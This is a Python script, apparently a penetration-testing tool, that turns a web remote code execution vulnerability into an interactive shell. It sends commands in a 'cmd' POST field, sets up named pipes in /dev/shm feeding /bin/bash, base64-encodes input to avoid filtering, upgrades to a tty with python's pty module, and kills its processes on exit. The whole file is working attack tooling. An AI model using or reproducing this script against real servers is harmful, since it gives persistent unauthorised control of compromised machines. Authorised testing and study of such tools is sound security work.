#!/usr/bin/python3

from cmd import Cmd
import requests
import readline
import sys
from base64 import b64encode
from random import randrange
import threading
from time import sleep



class AllTheReads(object):
	"""AllTheReads"""
	def __init__(self, interval=2):
		self.interval = interval
		self.thread = threading.Thread(target=self.run, args=())
		self.thread.daemon = True
		self.thread.start()

	def run(self):
		while True:
			output = get_output()
			if output:
				print(output, flush=True, end="")
				clean_output()
			else:
				break
			sleep(self.interval)



def executeCommand(command):
	"""execute system command via RCE"""
	headers = {
		"Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		"User-Agent"  : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"
	}
	url = 'http://127.0.0.1'
	post_data = {"cmd":f"{command}"}
	proxies = {"http": "http://127.0.0.1:8080"}
	resp = requests.post(url, data=post_data, headers=headers, proxies=proxies, timeout=5)
	return resp.text


def setupShell():
	namePipes = f"mkfifo {stdin}; tail -f {stdin} | /bin/bash -i 2>&1 > {stdout}"
	try:
		executeCommand(namePipes)
	except:
		pass


def get_output():
	'Get the named pip file content.'
	command = f"/bin/cat {stdout}"
	# print("[*] Getting command execution result...")
	return executeCommand(command)
	

def clean_output():
	'Clean the named pip file content.'
	# print("[*] Cleaning output...")
	command = f"echo -n '' > {stdout}"
	executeCommand(command)


def clean_shell():
	kill_process = f"""kill -9 $(ps aux | grep {session} | grep -v grep """+"""| awk '{print $2}' | tr '\n' ' ')"""
	kill_pty = f"""kill -9 $(ps aux | grep pty | grep -v grep """+ """ | awk '{print $2}')"""
	print("\n[*] Cleaning shell...")
	executeCommand(kill_process)
	executeCommand(kill_pty)
	print("[*] Shell cleaned.")



class Terminal(Cmd):
	intro = 'Make Web Remote Code Execution Vulnerabilities Great Again!'
	prompt = '> '


	def __init__(self):
		self.is_upgrade_shell = False
		super().__init__()
		# self.setup_shell()


	def setup_shell(self):
		'Setup a new named pipe'
		print("[*] Setuping named pip...")
		setupShell()
		print("[*] Setup Finished.")


	def do_upgrade_shell(self, args):
		'Got tty via python pty module'
		python_tty = f"""python -c 'import pty;pty.spawn("/bin/bash")'""" + '\n'
		command = f'''echo "{b64encode(python_tty.encode()).decode()}" | base64 -d > {stdin}'''
		executeCommand(command)
		self.is_upgrade_shell = True
		print(get_output(), flush=True, end="")
		clean_output()


	def clean_shell(self):
		'Clean named pipe'
		clean_shell()


	def do_bye(self, args):
		'Stop window, and exit: BYE'
		self.clean_shell()
		print('Thank you for using this great script')
		sys.exit(0)


	def default(self, args):
		args += '\n'
		command = f'''echo "{b64encode(args.encode()).decode()}" | base64 -d > {stdin}'''
		executeCommand(command)
		readThings = AllTheReads()
		sleep(2)
		

def main():
	print("[*] Setuping named pip...")
	setupShell()
	print("[*] Setup Finished.")
	terminal = Terminal()
	try:
		terminal.cmdloop()
	except KeyboardInterrupt:
		clean_shell()
		print("Bye~")
		sys.exit(0)


if __name__ == "__main__":
	global stdin, stdout
	session = randrange(1111, 9999)
	stdin = f"/dev/shm/input.{session}"
	stdout = f"/dev/shm/output.{session}"
	main()